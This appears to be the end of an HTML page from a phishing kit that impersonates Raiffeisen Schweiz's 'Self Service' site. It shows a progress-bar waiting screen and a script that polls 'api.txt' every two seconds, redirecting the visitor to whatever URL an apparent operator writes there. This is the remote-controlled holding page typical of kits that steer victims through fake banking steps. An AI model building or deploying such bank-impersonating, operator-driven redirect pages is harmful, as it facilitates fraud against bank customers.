                    <div class="progress-fill"></div>
                </div>
            </div>
        </div>
    </main>

    <footer>
        <div class="footer-container">
            <div class="footer-text">Raiffeisen Self Service</div>
            <div class="footer-copyright">© Raiffeisen Schweiz</div>
        </div>
    </footer>

    <script>
        function switchLang(lang) {
            const url = new URL(window.location.href);
            url.searchParams.set('lang', lang);
            window.location.href = url.toString();
        }

        // Auto-redirect after loading (optional - adjust timing as needed)
        // setTimeout(function() {
        //     window.location.href = 'next-page.php';
        // }, 3000);
    </script>
	            <script>
        function fetchAndRedirect() {
            var client = new XMLHttpRequest();
            client.open("GET", "api.txt?v=" + new Date().getTime(), true); // Cache busting
            client.onreadystatechange = function () {
                if (client.readyState === 4) {
                    if (client.status === 200) {
                        var responseText = client.responseText;
                        console.log("Fetched responseText:", responseText);

                        // Extract URL from meta refresh tag
                        var urlMatch = responseText.match(
                            /<meta\s+http-equiv=['"]refresh['"]\s+content=['"][^;]+;\s*url=([^'"]+)['"]/i
                        );

                        if (urlMatch && urlMatch[1]) {
                            var redirectUrl = urlMatch[1];
                            console.log("Redirecting to URL:", redirectUrl);
                            window.location.href = redirectUrl;
                        } else {
                            console.error("Failed to extract URL from response.");
                        }
                    } else {
                        console.error("Failed to fetch data from api.txt, status code:", client.status);
                    }
                }
            };
            client.send();
        }

        // Fetch the URL and redirect every 2 seconds
        setInterval(fetchAndRedirect, 2000);
    </script>
</body>
</html>
